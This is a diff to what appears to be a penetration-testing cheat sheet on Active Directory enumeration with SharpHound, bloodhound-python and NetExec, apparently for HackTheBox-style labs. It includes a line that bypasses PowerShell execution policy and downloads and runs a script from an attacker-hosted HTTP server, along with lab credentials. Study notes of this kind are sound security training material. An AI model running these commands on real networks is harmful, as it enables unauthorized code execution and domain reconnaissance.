@@ -3,30 +3,45 @@
 
 ## Sharphound
 
+```
 /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1  
+```
   
 ### local  
+```
 cd /usr/share/metasploit-framework/data/post/powershell/  
 python -m http.server 80  
+```
   
 ### target  
+```
 powershell -ep bypass  
 IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.180/SharpHound.ps1')  
+```
   
 #### Help Page  
+```
 Get-Help Invoke-BloodHound  
+```
   
 #### Get all info  
+```
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\celia.almeda\Documents\ -OutputPrefix "audit"  
   
+```
 
 # Remote
 ## Bloodhound-python
-```
+```bash
+# for Legacy
 bloodhound-python -c all -u james -p 'J@m3s_P@ssW0rd!'  -ns 10.10.10.52 -d htb.local --zip
 
-bloodhound-python -c <collection method> -u <username> -p <password>  -ns <dns-server> -d <domain> --zip
+# For CE
+
+bloodhound-ce-python -c all -u james -p 'J@m3s_P@ssW0rd!'  -ns 10.10.10.52 -d htb.local --zip
 ```
+
+## Netexec 
 
 ```bash
 nxc ldap 10.1.1.1 -u 'username' -p 'password' --bloodhound --collection ALL --dns-server 10.1.1.1
@@ -34,8 +49,10 @@ nxc ldap 10.1.1.1 -u 'username' -p 'password' --bloodhound --collection ALL --dn
 # Bloodhound
   
 ## local  
+```
 sudo neo4j start  
 bloodhound  
+```
   
 ## Raw Queries
 ### Get all Computers  
